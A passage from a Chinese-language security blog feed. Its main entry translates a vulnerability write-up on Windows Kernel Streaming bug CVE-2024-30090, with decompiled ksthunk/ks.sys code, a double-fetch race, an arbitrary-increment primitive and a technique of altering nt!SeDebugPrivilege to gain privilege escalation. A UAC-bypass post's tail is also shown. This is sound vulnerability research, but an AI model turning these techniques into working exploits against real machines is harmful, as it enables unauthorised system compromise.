href="https://www.x86matthew.com/view_post?id=create_svc_rpc">CreateSvcRpc</a>中为<strong>服务控制管理器</strong>RPC 接口做了这件事！<br>我们需要做的唯一改变是强制使用<strong>SMB</strong>而不是<strong>ALPC</strong>，这在技术上意味着将管道路径从\\.\pipe\ntsvcs 更改为\\127.0.0.1\pipe\ntsvcs。</p><p>让我们看看完整的利用链在行动😎 </p><img src="/2024/10/23/%E5%88%A9%E7%94%A8-SSPI-%E6%95%B0%E6%8D%AE%E6%8A%A5%E4%B8%8A%E4%B8%8B%E6%96%87%E7%BB%95%E8%BF%87-UAC/demo.png" class="" title="img"><p>演示的源代码可以在→<a href="https://github.com/antonioCoco/SspiUacBypass">https://github.com/antonioCoco/SspiUacBypass</a>找到。</p><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>向<a href="https://twitter.com/tiraniddo">James Forshaw</a>和<a href="https://twitter.com/x86matthew">@x86matthew</a>致敬，他们的研究提供了宝贵的见解。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://youtu.be/G5HjD4nMbUc">ZeroNights 2017 James Forshaw Abusing Access Tokens for UAC Bypasses</a></li><li><a href="https://www.tiraniddo.dev/2017/05/reading-your-way-around-uac-part-1.html">Reading Your Way Around UAC (Part 1)</a></li><li><a href="https://www.tiraniddo.dev/2017/05/reading-your-way-around-uac-part-2.html">Reading Your Way Around UAC (Part 2)</a></li><li><a href="https://www.tiraniddo.dev/2017/05/reading-your-way-around-uac-part-3.html">Reading Your Way Around UAC (Part 3)</a></li><li><a href="https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html">Farewell to the Token Stealing UAC Bypass</a></li><li><a href="https://www.tiraniddo.dev/2019/02/accessing-access-tokens-for-uiaccess.html">Accessing Access Tokens for UIAccess</a></li><li><a href="https://www.tiraniddo.dev/2022/03/bypassing-uac-in-most-complex-way.html">Bypassing UAC in the most Complex Way Possible!</a></li><li><a href="https://www.tiraniddo.dev/2020/04/sharing-logon-session-little-too-much.html">Sharing a Logon Session a Little Too Much</a></li><li><a href="https://www.x86matthew.com/view_post?id=create_svc_rpc">CreateSvcRpc - A custom RPC client to execute programs as the SYSTEM user</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>windows权限提升</category>
      
    </categories>
    
    
    <tags>
      
      <tag>主机安全</tag>
      
      <tag>UAC BYPASS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows内核流漏洞研究和挖掘全流程(part2)</title>
    <link href="/2024/10/22/windows%E5%86%85%E6%A0%B8%E6%B5%81%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%E5%92%8C%E6%8C%96%E6%8E%98%E5%85%A8%E6%B5%81%E7%A8%8B-part2/"/>
    <url>/2024/10/22/windows%E5%86%85%E6%A0%B8%E6%B5%81%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%E5%92%8C%E6%8C%96%E6%8E%98%E5%85%A8%E6%B5%81%E7%A8%8B-part2/</url>
    
    <content type="html"><![CDATA[<h1 id="《Windows-内核中的流漏洞——代理到内核——第二部分"><a href="#《Windows-内核中的流漏洞——代理到内核——第二部分" class="headerlink" title="《Windows 内核中的流漏洞——代理到内核——第二部分"></a>《Windows 内核中的流漏洞——代理到内核——第二部分</h1><p>在之前的一篇研究中，我们在内核流中发现了多个漏洞以及一个被忽视的漏洞类别。我们在 2024 年温哥华 Pwn2Own 大赛中成功利用漏洞 CVE-2024-35250 和 CVE-2024-30084 攻陷了 Windows 11。 在本文中，我们将继续探索这个攻击面和漏洞类别，揭示另一个漏洞和利用技术，该技术也在 <a href="https://www.hexacon.fr/">HEXACON 2024</a>上进行了展示。 经过一段时间后，我们在 KS 对象的属性操作中没有发现其他可利用的点。因此，我们将注意力转移到另一个功能——KS 事件（KS Event）上。 </p><h3 id="KS-事件"><a href="#KS-事件" class="headerlink" title="KS 事件"></a><a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/ks-events">KS 事件</a></h3><p>与上一篇文章中提到的<a href="https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1-en/#ks-property">KS 属性</a>类似，KS 对象不仅有自己的属性集，还提供了设置 KS 事件的功能。例如，你可以设置一个事件，在设备状态改变时或在固定时间间隔触发，这对于播放软件的开发者来说很方便，可以定义后续的行为。每个 KS 事件，就像一个属性一样，需要 KS 对象支持才能使用。我们可以通过<a href="https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/ks/ni-ks-ioctl_ks_enable_event">IOCTL_KS_ENABLE_EVENT</a>和<a href="https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/ks/ni-ks-ioctl_ks_disable_event">IOCTL_KS_DISABLE_EVENT</a>来注册或禁用这些事件。 </p><h3 id="KSEVENTDATA"><a href="#KSEVENTDATA" class="headerlink" title="KSEVENTDATA"></a>KSEVENTDATA</h3><p>在注册 KS 事件时，你可以通过提供<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ks/ns-ks-kseventdata">KSEVENTDATA</a>来注册所需的事件。你可以在注册中包含诸如 EVENT_HANDLE（事件句柄）和 SEMAPHORE_HANDLE（信号量句柄）等句柄。当 KS 触发这个事件时，它将使用提供的句柄通知你。 </p><h3 id="IOCTL-KS-ENABLE-EVENT-的工作流程"><a href="#IOCTL-KS-ENABLE-EVENT-的工作流程" class="headerlink" title="IOCTL_KS_ENABLE_EVENT 的工作流程"></a>IOCTL_KS_ENABLE_EVENT 的工作流程</h3><p>整个工作流程与 IOCTL_KS_PROPERTY 类似。当调用 DeviceIoControl 时，如下图所示，用户的请求依次传递给相应的驱动程序进行处理。 <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1021/1.png"> 同样，在步骤 3 中，32 位请求将被转换为 64 位请求。到步骤 6 时，ks.sys 将根据你的请求的事件确定哪个驱动程序和<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ks/nc-ks-pfnksaddevent">addhandler</a>来处理你的请求。 <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1021/2.png"> 最后，将其转发到相应的驱动程序。如上图所示，最终它被转发到 ks 中的“KsiDefaultClockAddMarkEvent”以设置<a href="https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/wdm/nf-wdm-kesettimerex">定时器</a>。 在掌握了 KS 事件的功能和流程后，我们根据之前的<a href="https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1/#the-new-bug-pattern">漏洞模式</a>迅速确定了另一个可利用的漏洞<a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2024-30090">CVE-2024-30090</a>。 再次代理到内核！ </p><hr><p>这次，问题出现在“ksthunk”将 32 位请求转换为 64 位请求的时候。 如下图所示，当“ksthunk”接收到一个“IOCTL_KS_ENABLE_EVENT”请求且请求来自一个 WoW64 进程时，它将执行从 32 位结构到 64 位结构的转换。 <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1021/3.png"> 这个转换将调用“ksthunk!CKSAutomationThunk::ThunkEnableEventIrp”来处理它。 </p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs xl">__int64 __fastcall CKSAutomationThunk::ThunkEnableEventIrp(__int64 ioctlcode_d, PIRP irp, __int64 a3, int *a4)<br>&#123;<br> ...<br>  <span class="hljs-function"><span class="hljs-title">if</span> ( (v25-&gt;</span>P<span class="hljs-function"><span class="hljs-title">arameters</span>.DeviceIoControl.Type3InputBuffer-&gt;</span>Flags &amp; <span class="hljs-number">0</span>xEFFFFFFF) == KSEVENT_TYPE_ENABLE<br>    || (<span class="hljs-function"><span class="hljs-title">v25</span>-&gt;</span>P<span class="hljs-function"><span class="hljs-title">arameters</span>.DeviceIoControl.Type3InputBuffer-&gt;</span>Flags &amp; <span class="hljs-number">0</span>xEFFFFFFF) == KSEVENT_TYPE_ONESHOT<br>    || (<span class="hljs-function"><span class="hljs-title">v25</span>-&gt;</span>P<span class="hljs-function"><span class="hljs-title">arameters</span>.DeviceIoControl.Type3InputBuffer-&gt;</span>Flags &amp; <span class="hljs-number">0</span>xEFFFFFFF) == KSEVENT_TYPE_ENABLEBUFFERED )  <br>  &#123;<br>    <span class="hljs-comment">// 将 32 位请求转换并直接传递下去</span><br>  &#125;<br>  <span class="hljs-function"><span class="hljs-title">else</span> <span class="hljs-keyword">if</span> ( (v25-&gt;</span>P<span class="hljs-function"><span class="hljs-title">arameters</span>.DeviceIoControl.Type3InputBuffer-&gt;</span>Flags &amp; <span class="hljs-number">0</span>xEFFFFFFF) == KSEVENT_TYPE_QUERYBUFFER ) <br>  &#123;<br>   ...<br>    newinputbuf = (KSEVENT *)ExAllocatePoolWithTag((POOL_TYPE)<span class="hljs-number">0</span>x600, (unsigned int)(inputbuflen + <span class="hljs-number">8</span>), <span class="hljs-string">&#x27;bqSK&#x27;</span>);<br>   ...<br>    memcpy(newinputbuf,Type3InputBuffer,<span class="hljs-number">0</span>x28);  <span class="hljs-comment">//------------------------[1]</span><br>   ...<br>    v18 = KsSynchronousIoControlDevice( <br>            <span class="hljs-function"><span class="hljs-title">v25</span>-&gt;</span>FileObject,<br>            <span class="hljs-number">0</span>,<br>            IOCTL_KS_ENABLE_EVENT,<br>            newinputbuf,<br>            inputbuflen + <span class="hljs-number">8</span>,<br>            OutBuffer,<br>            outbuflen,<br>            &amp;BytesReturned);  <span class="hljs-comment">//-----------------[2]</span><br>   ...<br>  &#125;<br> ...<br>&#125;<br></code></pre></td></tr></table></figure><p>在“CKSAutomationThunk::ThunkEnableEventIrp”中，明显可以看到一个类似的漏洞模式。你可以看到，在处理过程中，原始请求首先被复制到一个新分配的缓冲区中，如[1]所示。随后，这个缓冲区被用于通过“KsSynchronousIoControlDevice”调用新的 IOCTL，如[2]所示。“newinputbuf”和“OutBuffer”都由用户控制。 调用“CKSAutomationThunk::ThunkEnableEventIrp”的流程如下所示： <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1021/4.png"> 当在 WoW64 进程中调用 IOCTL 时，你可以在图中的步骤 2 中看到，I&#x2F;O 管理器将“Irp-&gt;RequestorMode”设置为用户模式（UserMode(1)）。在步骤 3 中，ksthunk 将用户的请求从 32 位转换为 64 位，由“CKSAutomationThunk::ThunkEnableEventIrp”处理。 <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1021/5.png"> 之后，在步骤 5 中，“KsSynchronousIoControlDevice”将被调用以发出 IOCTL，此时，新的“Irp-&gt;RequestorMode”已变为<strong>内核模式（KernelMode(0)）</strong>。后续的处理与典型的“IOCTL_KS_ENABLE_EVENT”相同，因此不再详细说明。总之，我们现在有了一个允许我们以内核模式执行任意“IOCTL_KS_ENABLE_EVENT”的原语。接下来，我们需要寻找可以实现权限提升（EoP）的地方。</p><h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><hr><p>按照上一篇公众号分享的方法，我们首先分析了入口点“ksthunk”。然而，经过一段时间的搜索，我们没有找到潜在的权限提升点。在“ksthunk”中，大多数“Irp-&gt;RequestMode”为“KernelMode(0)”的情况都是直接传递下去，没有进行额外的处理。因此，我们将目光转向下一层，“ks”，看看在事件处理过程中是否有任何权限提升的机会。 <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1021/6.png"> 很快，我们找到了一个引起我们注意的地方。 <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1021/7.png"> 在“KspEnableEvent”处理程序中，一段代码首先检查你传入的“KSEVENTDATA”中的“NotificationType”，以确定如何注册和处理你的事件。通常，它通常提供一个<a href="https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-createeventa">EVENT_HANDLE</a>或一个<a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createsemaphorea">SEMAPHORE_HANDLE</a>。然而，在“ks”中，如果从“内核模式”调用，我们可以提供一个<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/event-objects">事件对象</a>甚至一个<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/introduction-to-dpc-objects">延迟过程调用（DPC）对象</a>来注册你的事件，使整体处理更加高效。 </p><p>这意味着我们可以使用这个具有“内核模式”原语的“DeviceIoControl”来提供一个<strong>内核对象</strong>进行后续处理。如果构建得好，它可能实现“EoP”，但这取决于这个“对象”在后面是如何使用的。 然而，经过一段时间的尝试，我们发现…… </p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs xl">__int64 __fastcall CKSAutomationThunk::ThunkEnableEventIrp(__int64 ioctlcode_d, PIRP irp, __int64 a3, int *a4)<br>&#123;<br> ...<br>  <span class="hljs-function"><span class="hljs-title">if</span> ( (v25-&gt;</span>P<span class="hljs-function"><span class="hljs-title">arameters</span>.DeviceIoControl.Type3InputBuffer-&gt;</span>Flags &amp; <span class="hljs-number">0</span>xEFFFFFFF) == KSEVENT_TYPE_ENABLE<br>    || (<span class="hljs-function"><span class="hljs-title">v25</span>-&gt;</span>P<span class="hljs-function"><span class="hljs-title">arameters</span>.DeviceIoControl.Type3InputBuffer-&gt;</span>Flags &amp; <span class="hljs-number">0</span>xEFFFFFFF) == KSEVENT_TYPE_ONESHOT<br>    || (<span class="hljs-function"><span class="hljs-title">v25</span>-&gt;</span>P<span class="hljs-function"><span class="hljs-title">arameters</span>.DeviceIoControl.Type3InputBuffer-&gt;</span>Flags &amp; <span class="hljs-number">0</span>xEFFFFFFF) == KSEVENT_TYPE_ENABLEBUFFERED )  <span class="hljs-comment">//-------[3]</span><br>  &#123;<br>    <span class="hljs-comment">// 将 32 位请求转换并直接传递下去</span><br>  &#125;<br>  <span class="hljs-function"><span class="hljs-title">else</span> <span class="hljs-keyword">if</span> ( (v25-&gt;</span>P<span class="hljs-function"><span class="hljs-title">arameters</span>.DeviceIoControl.Type3InputBuffer-&gt;</span>Flags &amp; <span class="hljs-number">0</span>xEFFFFFFF) == KSEVENT_TYPE_QUERYBUFFER ) <span class="hljs-comment">//-------[4]</span><br>  &#123;<br>   ...<br>    newinputbuf = (KSEVENT *)ExAllocatePoolWithTag((POOL_TYPE)<span class="hljs-number">0</span>x600, (unsigned int)(inputbuflen + <span class="hljs-number">8</span>), <span class="hljs-string">&#x27;bqSK&#x27;</span>);<br>   ...<br>    memcpy(newinputbuf,Type3InputBuffer,<span class="hljs-number">0</span>x28); <span class="hljs-comment">//------[5] </span><br>   ...<br>    v18 = KsSynchronousIoControlDevice( <br>            <span class="hljs-function"><span class="hljs-title">v25</span>-&gt;</span>FileObject,<br>            <span class="hljs-number">0</span>,<br>            IOCTL_KS_ENABLE_EVENT,<br>            newinputbuf,<br>            inputbuflen + <span class="hljs-number">8</span>,<br>            OutBuffer,<br>            outbuflen,<br>            &amp;BytesReturned);  <br>   ...<br>  &#125;<br> ...<br>&#125; <br></code></pre></td></tr></table></figure><p> 如果你想提供一个内核对象来注册一个事件，那么在 IOCTL 中为<a href="https://learn.microsoft.com/zh-tw/windows-hardware/drivers/stream/ksevent-structure">KSEVENT</a>给出的标志必须在[3]处为“KSEVENT_TYPE_ENABLE”。然而，在触发漏洞的[4]处，它必须是“KSEVENT_TYPE_QUERYBUFFER”，并且不可能像我们预期的那样直接提供一个内核对象。</p><p> 幸运的是，“IOCTL_KS_ENABLE_EVENT”也使用“Neither I&#x2F;O”来传输数据。它再次出现了“双重获取（Double Fetch）”问题。 <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1021/9.png"> 如上图所示，我们可以在调用 IOCTL 之前将标志设置为“KSEVENT_TYPE_QUERYBUFFER”。</p><p>在检查时，它将以“KSEVENT_TYPE_QUERYBUFFER”进行处理。在第二次调用“KsSynchronousIoControlDevice”之前，我们可以将标志更改为“KSEVENT_TYPE_ENABLE”。 这样，我们就可以成功触发漏洞并构建一个特定的内核对象来注册事件。 </p><h3 id="触发事件"><a href="#触发事件" class="headerlink" title="触发事件"></a>触发事件</h3><p>什么时候会使用你构建的内核对象呢？当一个事件被触发时，ks 将通过延迟过程调用（DPC）调用“ks!ksGenerateEvent”。此时，它将根据你指定的“NotificationType”确定如何处理你的事件。 让我们看一下 KsGenerateEvent。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xl">NTSTATUS __stdcall KsGenerateEvent(PKSEVENT_ENTRY EventEntry)<br>&#123;<br><br>  <span class="hljs-function"><span class="hljs-title">switch</span> ( EventEntry-&gt;</span>NotificationType )<br>  &#123;<br>    case KSEVENTF_DPC:<br>     ...<br>      <span class="hljs-function"><span class="hljs-title">if</span> (!KeInsertQueueDpc(EventEntry-&gt;</span>E<span class="hljs-function"><span class="hljs-title">ventData</span>-&gt;</span>D<span class="hljs-function"><span class="hljs-title">pc</span>.Dpc, EventEntry-&gt;</span>EventData, <span class="hljs-number">0</span>LL) )<br>        _I<span class="hljs-function"><span class="hljs-title">nterlockedAdd</span>(&amp;EventEntry-&gt;</span>E<span class="hljs-function"><span class="hljs-title">ventData</span>-&gt;</span>EventObject.Increment, <span class="hljs-number">0</span>xFFFFFFFF); <span class="hljs-comment">//--------[6]</span><br>     ...<br>    case KSEVENTF_KSWORKITEM:<br>     ...<br>      K<span class="hljs-function"><span class="hljs-title">sIncrementCountedWorker</span>(eventdata-&gt;</span>KsWorkItem.KsWorkerObject); <span class="hljs-comment">//-----------[7]</span><br><br>  &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>此时，有多种利用方法。最直接的方法是直接构建一个 DPC 结构并排队一个 DPC 以实现任意内核代码执行，这对应于[6]处的代码片段。然而，调用 KsGenerateEvent 时的中断请求级别（IRQL）为“DISPATCH_LEVEL”，使得在用户空间中构建 DPC 对象非常困难，并且利用过程会遇到很多问题。 </p><p>因此，我们选择另一种途径，使用[7]处的“KSEVENTF_KSWORKITEM”。这种方法涉及传入一个内核地址并进行操作，使其被识别为指向<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ks/ns-ks-kseventdata">KSWORKITEM</a>的指针。 <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1021/10.png"> 它可以实现将任意内核地址的值增加一。整个过程如下图所示。 <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1021/11.png"> 当调用“IOCTL_KS_ENABLE_EVENT”时，在构建“KSEVENTDATA”以指向一个内核内存地址后，ks 将把它作为内核对象处理并注册指定的事件。 <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1021/12.png"> 当触发时，ks 将增加我们提供的内存地址中的内容。因此，我们在这里有一个内核任意增加的原语。 </p><h3 id="从任意增加原语到EoP"><a href="#从任意增加原语到EoP" class="headerlink" title="从任意增加原语到EoP"></a>从任意增加原语到EoP</h3><p>从任意增加原语到权限提升，有很多方法可以利用，其中最著名的是<a href="https://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernal_Slides.pdf">滥用令牌权限</a>和<a href="https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/">IoRing</a>。起初，这似乎就是结束了。 然而，这两种方法在这种情况下都有一定的局限性： </p><h4 id="滥用令牌权限"><a href="#滥用令牌权限" class="headerlink" title="滥用令牌权限"></a>滥用令牌权限</h4><p>如果我们使用滥用令牌权限的方法进行权限提升，关键在于该技术中的覆盖“Privileges.Enable”和“Privileges.Present”。由于我们的漏洞每次只能增加一，因此两个字段都需要被写入才能获得“SeDebugPrivilege”。这两个字段的默认值分别为“0x602880000”和“0x800000”，需要更改为 0x602<strong>9</strong>80000 和 0x<strong>9</strong>00000。这意味着每个字段需要被写入 0x10 次，总共需要写入 0x20 次。每次写入都需要一个竞争条件，这需要时间并显著降低了稳定性。 </p><h4 id="IoRing"><a href="#IoRing" class="headerlink" title="IoRing"></a>IoRing</h4><p>使用IoRing 实现任意写入可能是一种更简单的方法。为了实现任意写入，你只需要覆盖“IoRing-&gt;RegBuffersCount”和“IoRing-&gt;RegBuffers”。然而，一个问题出现了。 <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1021/13.png"> 当触发任意增加时，如果原始值为 0，它将调用“KsQueueWorkItem”，其中会发生一些相应的复杂处理，导致蓝屏死机（BSoD）。IoRing 的利用方法恰好遇到了这种情况…… </p><p> 真的无法稳定地进行利用吗？ </p><h4 id="寻找新的方法！"><a href="#寻找新的方法！" class="headerlink" title="寻找新的方法！"></a>寻找新的方法！</h4><blockquote><p>当传统的利用方法遇到障碍时，深入研究技术的核心机制可能是值得的。在这个过程中，你可能会意外地发现新的方法。 </p></blockquote><p>经过几天的思考，我们决定寻找一种新的方法。然而，从头开始可能需要相当长的时间，并且可能不会有结果。因此，我们选择从两种现有方法中获得新的灵感。首先，让我们看一下“滥用令牌权限”。这里的关键是利用漏洞获得“SeDebugPrivilege”，允许我们打开高权限进程，如“winlogon”。 问题出现了：为什么拥有“SeDebugPrivilege”允许你打开高权限进程？ 我们首先需要看一下“nt!PsOpenProcess”。 <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1021/15.png"> 从这个代码片段中，我们可以看到，当我们打开进程时，内核将使用<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-sesingleprivilegecheck">SeSinglePrivilegeCheck</a>来检查你是否具有 SeDebugPrivilege。如果你有它，你将被授予“PROCESS_ALL_ACCESS”权限，允许你对除了受保护进程（PPL）之外的任何进程执行任何操作。</p><p>顾名思义，它是用于调试目的的。然而，值得注意的是，“nt!SeDebugPrivilege”是“ntoskrnl.exe”中的一个全局变量。 <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1021/16.png"> 它是一个<a href="https://learn.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-luid">本地唯一标识符（LUID）</a>结构，在系统启动时初始化。实际值为 0x14，表示“Privileges.Enable”和“Privileges.Present”字段中的哪个位代表“SeDebugPrivilege”。因此，当我们使用 NtOpenProcess 时，系统读取这个全局变量的值。 <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1021/17.png"> 一旦获得“nt!SeDebugPrivilege”的值，它将用于检查令牌中的“Privileges”字段，以查看“Enable”和“Present”字段是否被设置。对于“SeDebugPrivilege”，它将检查第 0x14 位。 <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1021/18.png"> 然而，有一个有趣的事情…… <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1021/19.png"> 全局变量“nt!SeDebugPrivilege”位于一个可写的部分！ 一个新的想法诞生了。</p><h4 id="魔改滥用令牌权限"><a href="#魔改滥用令牌权限" class="headerlink" title="魔改滥用令牌权限"></a>魔改滥用令牌权限</h4><p>默认情况下，普通用户将只有有限数量的“特权（Privileges）”，如下图所示。 <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1021/20.png"> 我们可以注意到，在大多数情况下，“SeChangeNotifyPrivilege”是启用的。此时，我们可以查看初始化部分，发现“SeChangeNotifyPrivilege”代表值 0x17。 <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1021/21.png"> 如果我们使用漏洞将“nt!SeDebugPrivilege”从 0x14 更改为 0x17 会发生什么？ <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1021/22.png"> 如图所示，在“NtOpenProcess”流程中，它将首先获取“nt!SeDebugPrivilege”的值，此时获得的值是 0x17（SeChangeNotifyPrivilege）。 <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1021/23.png"> 下一个检查将使用 0x17 检查当前进程令牌，看它是否具有此“特权”。然而，普通用户通常具有“SeChangeNotifyPrivilege”，所以即使你没有“SeDebugPrivilege”，你仍然会通过检查并获得“PROCESS_ALL_ACCESS”。换句话说，任何具有“SeChangeNotifyPrivilege”的人都可以打开除 PPL 之外的高权限进程。 </p><p>此外，通过使用上述漏洞，我们可以将“nt!SeDebugPrivilege”从<strong>0x14 更改为 0x17</strong>。由于原始值不为 0，它将不受“KsQueueWorkItem”的影响，非常适合我们的目的。 <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1021/24.png"> 一旦我们可以打开高权限进程，权限提升的方法与“滥用令牌权限”方法相同，因此我们在这里不再详细说明。最终，我们通过再次利用代理到内核在 Windows 11 23H2 上成功实现了权限提升（EoP）。 </p><h4 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h4><p>实际上，这种技术也适用于其他 “特权”。</p><ul><li>SeTcbPrivilege &#x3D; 0x7</li><li>SeTakeOwnershipPrivilege &#x3D; 0x9</li><li>SeLoadDriverPrivilege &#x3D; 0xa</li><li>…</li></ul><p>下一步和总结</p><hr><p>这两篇文章的重点主要是我们如何分析过去的漏洞以发现新的漏洞，我们如何从以前的研究中获得新的想法，找到新的利用方法、新的漏洞和新的攻击面。</p><p>这个漏洞类别可能仍然存在许多安全问题，并且它们可能不仅限于内核流和<a href="https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/wdm/nf-wdm-iobuilddeviceiocontrolrequest">IoBuildDeviceIoControlRequest</a>。我相信这是 Windows 中的一个设计缺陷，如果我们仔细搜索，我们可能会发现更多的漏洞。</p><p>对于这种类型的漏洞，你需要注意设置 “Irp-&gt;RequestorMode” 的时机。如果它被设置为 “内核模式”，然后使用用户输入，可能会出现问题。此外，这种类型的漏洞通常非常容易被利用。</p><p>在内核流中，我相信有相当多的潜在安全漏洞。也有许多组件，如 “Hdaudio.sys” 或 “Usbvideo.sys”，可能值得检查，并且是模糊测试的合适地方。如果你是一个内核驱动程序开发人员，最好不要只检查 “Irp-&gt;RequestorMode”。在 Windows 架构中可能仍然存在问题。最后，我强烈建议每个人尽快将 Windows 更新到最新版本。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><hr><ul><li><a href="https://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernal_Slides.pdf">Easy Local Windows Kernel Exploitation</a></li><li><a href="https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/">One I&#x2F;O Ring to Rule Them All: A Full Read&#x2F;Write Exploit Primitive on Windows 11</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>漏洞分析与挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内核漏洞</tag>
      
      <tag>主机安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows内核流漏洞研究和挖掘全流程(part1)</title>
    <link href="/2024/10/21/windows%E5%86%85%E6%A0%B8%E6%B5%81%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%E5%92%8C%E6%8C%96%E6%8E%98%E5%85%A8%E6%B5%81%E7%A8%8B-part1/"/>
    <url>/2024/10/21/windows%E5%86%85%E6%A0%B8%E6%B5%81%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%E5%92%8C%E6%8C%96%E6%8E%98%E5%85%A8%E6%B5%81%E7%A8%8B-part1/</url>
    
